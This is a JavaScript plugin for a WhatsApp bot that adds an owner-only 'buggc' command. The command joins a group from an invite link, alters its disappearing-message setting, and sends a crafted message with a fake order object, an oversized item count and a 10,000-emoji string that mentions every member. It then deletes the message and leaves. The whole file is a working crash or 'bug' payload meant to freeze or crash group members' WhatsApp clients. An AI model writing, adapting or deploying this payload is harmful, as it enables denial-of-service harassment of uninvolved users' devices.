let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text }) => {
    let [_, code] = text.match(linkRegex) || []
    if (!code) throw 'Link invalido'
    let { gid: target } = await conn.acceptInvite(code)
    let member = (await conn.groupMetadata(target)).participants.map(v => v.jid)
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0})
await conn.sendMessage(target, 'Lolibot - OFC', 'conversation', {
 quoted: {
  key: {
  remoteJid: 'status@broadcast',
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999999999999999999999999999999999999999999999999999,
    status: 1,
    surface: 1,
    message: '🔥'.repeat(10000),
    orderTitle: 'HAI KAK',
    sellerJid: '0@s.whatsapp.net'
   }
  }
 }, contextInfo: { mentionedJid: member }
}).then(v => conn.modifyChat(v.key.remoteJid, 'delete'))
await conn.groupLeave(target)
}

handler.help = ['buggc <code>']
handler.tags = ['owner']
handler.command = /^(buggc)$/i

handler.rowner = true

module.exports = handler
